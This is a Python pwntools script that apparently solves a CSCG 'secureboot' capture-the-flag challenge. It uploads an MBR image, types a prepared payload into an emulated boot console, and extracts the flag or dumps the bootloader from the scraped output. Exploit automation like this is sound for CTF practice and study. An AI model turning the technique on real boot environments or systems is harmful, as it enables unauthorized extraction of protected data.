from pwn import *
import hashlib
def escape_ansi(line):
    ansi_escape = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    r =  ansi_escape.sub('', line)
    r = r.replace('\x1b(B', "")
    return r

def strip_nonhex(data):
    chars = list(filter(lambda x: x not in "0123456789ABCDEF", list(set(data))))
    for c in chars:
        data = data.replace(c,"")
    return data

r = process("ncat --ssl 156fe95e572913d77682103c-secureboot.challenge.master.cscg.live 31337", shell=True)
#r = remote('localhost', 1024)
r.sendlineafter(b"[1] PRODUCTION", b"0")
r.sendlineafter(b"[1] NOGRAPHIC", b"0")

with open("rootfs/basic.DOS_MBR", "rb") as f:
    data = f.read()

r.sendlineafter(b"[*] End your input with \"EOF\"", data.hex().encode()+b"EOF")

d = r.recvuntil(b"Hard Disk...")

with open("payload", "rb") as f:
    chunks = f.read().replace(b"\n", b"").split(b"\r")

r.recvpred(lambda d: ">" in escape_ansi(d.decode()))

print(len(chunks))
for i,c in enumerate(chunks):
    print(i/len(chunks))
    r.send(c+b'\r')
    r.recvpred(lambda d: c.decode() in escape_ansi(d.decode()), timeout=5)

r.send(b"list\r")
buf =b''
while True:
    ret = r.recv(4096, timeout=2)
    buf += ret
    if ret == b'':
        break
dumped = b''

#change if dump bootloader..
if True:
    print(buf)
    ret = strip_nonhex(escape_ansi(buf.decode()))
    print(ret)
    print(ret)
    start = ret.index("43534347")
    dumped = bytes.fromhex(ret[start:]).strip(b'\x00')
    print("FLAG:", dumped.decode())
else:
    with open("dumped_bootloader", "wb") as f:
        ret = strip_nonhex(escape_ansi(buf.decode()))
        end = ret.index("55AA")+4
        dumped = bytes.fromhex(ret[end-512*2:end])
        f.write(dumped)
    assert hashlib.sha1(dumped).hexdigest() == "c246a9169062372567baa2994910ce49995d84c9"
